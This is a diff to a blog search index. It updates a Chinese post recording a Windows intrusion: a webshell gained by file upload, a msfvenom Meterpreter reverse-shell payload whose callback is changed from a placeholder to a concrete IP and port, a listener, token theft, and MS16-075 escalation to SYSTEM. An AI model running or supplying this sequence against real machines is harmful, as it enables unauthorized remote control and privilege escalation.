@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[记一次Windows提权过程]]></title>
     <url>%2F2019%2F07%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B%2F</url>
-    <content type="text"><![CDATA[通过任意文件上传获取到ASP webshell 生成msf meterpreter后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe 启动监听 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST x.x.x.xset LPORT xxexploit 通过webshell上传并执行木马 msf接收到回话 查看当前用户 1getuid 12use incognito list_tokens -u 查找可利用的提权exp1run post/multi/recon/local_exploit_suggester 把当前msf回话放到后台，并记住其session值为51bg 利用ms16_075得到system权限]]></content>
+    <content type="text"><![CDATA[通过任意文件上传获取到ASP webshell 生成msf meterpreter后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &gt; shell1.exe 启动监听 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST x.x.x.xset LPORT xxexploit 通过webshell上传并执行木马 msf接收到回话 查看当前用户 1getuid 12use incognito list_tokens -u 查找可利用的提权exp1run post/multi/recon/local_exploit_suggester 把当前msf回话放到后台，并记住其session值为51bg 利用ms16_075得到system权限]]></content>
   </entry>
   <entry>
     <title><![CDATA[HEXO建站遇到的几个坑与解决方案]]></title>
